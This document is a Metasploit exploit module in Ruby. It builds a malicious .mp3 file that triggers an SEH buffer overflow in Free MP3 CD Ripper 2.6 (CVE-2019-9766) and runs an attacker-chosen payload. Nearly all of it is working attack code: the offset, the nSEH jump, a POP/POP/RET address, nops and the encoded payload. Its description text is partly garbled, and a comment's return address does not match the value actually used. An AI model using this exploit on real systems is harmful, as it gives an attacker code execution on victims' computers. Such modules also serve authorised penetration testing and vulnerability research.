##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Seh

  def initialize(info = {})
    super(update_info(info,
      'Name'    => 'Free MP3 CD Ripper 2.6 - .mp3 Buffer Overflow (SEH) ',
      'Description'  => %q{
          This module exploits a buffer overflow in Free MP3 CD Ripper 2.6, when
          with the name "explot.mp3". Copy the content of the  "hack.txt", Start the program and click "Convert" Find the file "exploit.mp3" and click "Open" 
      },
      'License'    => MSF_LICENSE,
      'Author'    =>
        [
          'Gionathan Reale ',            # Original discovery
          'Sungha Park',       # MSF module
        ],
      'References'  =>
        [
          [ 'OSVDB', '' ],
          [ 'EBD', '45403' ],
          [ 'CVE', '2019-9766' ]
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'process'
        },
      'Platform'  => 'win',
      'Payload'   =>
        {
          'BadChars'    => "\x00\x0a\x0d\x2f",
          'DisableNops' => true,
          'Space'       => 4440
        },
      'Targets'   =>
        [
          [ 'Free MP3 CD Ripper 2.6',
            {
              'Ret'     =>  0x66e42121, # 0x72d12f35 : P/P/R FROM msacm32.drv form winxp sp3
              'Offset'  =>  4116
            }
          ],
        ],
      'Privileged'  => false,
      'DisclosureDate'  => 'Oct 13 2018',
      'DefaultTarget'  => 0))

    register_options([OptString.new('FILENAME', [ false, 'The file name.', 'exploit.mp3']),], self.class)

  end

  def exploit
    buf = "\x41"*(target['Offset'])
    buf << "\xeb\x06#{Rex::Text.rand_text_alpha(2, payload_badchars)}" # nseh (jmp to payload)
    buf << [target.ret] .pack('V')  # seh
    buf << make_nops(8)
    buf << payload.encoded
    buf << "\x42" * 200

    file_create(buf)
    handler
    
  end
end
